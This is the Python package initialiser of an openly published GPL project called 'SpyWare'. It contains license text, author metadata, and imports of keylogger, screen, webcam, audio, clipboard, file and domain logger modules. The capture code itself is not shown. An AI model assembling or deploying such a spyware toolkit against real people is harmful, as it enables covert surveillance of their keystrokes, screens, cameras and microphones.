#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements a complete spyware.
#    Copyright (C) 2021, 2022, 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file implements a complete spyware.
"""

__version__ = "1.0.4"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022, 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = [
    "AudioLogger",
    "ClipboardLogger",
    "DomainsLogger",
    "FilesLogger",
    "KeyLogger",
    "ScreenLogger",
    "WebcamLogger",
    "spyware",
]

try:
    import AudioLogger
    import ClipboardLogger
    import DomainsLogger
    import FilesLogger
    import KeyLogger
    import ScreenLogger
    import WebcamLogger
    from SpyWare import main as spyware
except ImportError:
    from . import AudioLogger
    from . import ClipboardLogger
    from . import DomainsLogger
    from . import FilesLogger
    from . import KeyLogger
    from . import ScreenLogger
    from . import WebcamLogger
    from .SpyWare import main as spyware

print(copyright)
